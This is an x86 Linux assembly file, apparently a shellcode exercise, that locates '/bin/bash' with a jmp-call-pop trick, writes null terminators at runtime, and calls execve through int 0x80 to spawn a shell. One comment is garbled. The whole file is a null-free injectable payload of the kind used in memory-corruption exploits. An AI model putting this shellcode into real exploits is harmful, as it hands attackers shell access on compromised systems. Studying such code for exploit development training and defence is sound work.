global _start

section .text
_start:

jmp short pushOnStack


shellcode:
pop esi

;denting painting string in memory, removing garbage and adding nulls to match the syscall convention

xor ebx, ebx
mov byte [esi + 9], bl
mov DWORD[esi + 10], esi
mov DWORD[esi + 14], ebx

;preparing syscall
lea ebx, [esi]
lea ecx, [esi + 10]
lea edx, [esi + 14]

;syscall initiated, roger
xor eax, eax
mov al, 0xb
int 0x80

pushOnStack:
call shellcode
msg: db "/bin/bashABBBBCCCC"
